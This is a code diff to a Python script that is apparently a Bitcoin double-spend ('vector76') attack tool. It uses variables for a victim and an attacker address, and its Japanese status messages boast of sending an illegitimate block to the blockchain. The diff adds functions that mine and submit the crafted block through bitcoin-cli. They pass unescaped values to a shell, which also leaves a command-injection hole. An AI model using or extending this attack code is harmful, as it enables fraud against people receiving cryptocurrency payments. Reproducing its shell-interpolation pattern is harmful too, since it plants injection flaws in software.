@@ -91,6 +91,7 @@ def broadcast_mempool_space(raw_tx, testnet):
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
+
 args = parser.parse_args()
 fake_send_from   = args.from_wifkey
 victim_address   = args.send_to
@@ -99,6 +100,16 @@ amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
 coin_symbol = args.symbol
 fee = to_satoshi(args.fee)
+
+def generate_block(transaction_info):
+    return subprocess.run(f"bitcoin-cli generateblock {attacker_address} \"['{transaction_info}']\" false",
+                   shell=True,
+                   stdout=subprocess.PIPE).stdout
+
+def submit_block(block):
+    return subprocess.run(f"bitcoin-cli submitblock '{block}'",
+                   shell=True,
+                   stdout=subprocess.PIPE).stdout
 
 if testnet:
     print("testnet mode")
@@ -157,6 +168,8 @@ block = cryptos.serialize(block)
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
+mined_block = generate_block(block)
+print(mined_block)
 print()
 print("[+] READY...")
 print()
@@ -185,10 +198,10 @@ print("Index > 強固なブロックチェーン技術に対して強制干渉�
 print()
 time.sleep(1)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-time.sleep(1)
+time.sleep(0.5)
 print()
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)#broadcast_transaction(tx_attacker, testnet)
-broadcast_mempool_space(block, testnet)
+submit_block(mined_block)
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
 print()
 #print()
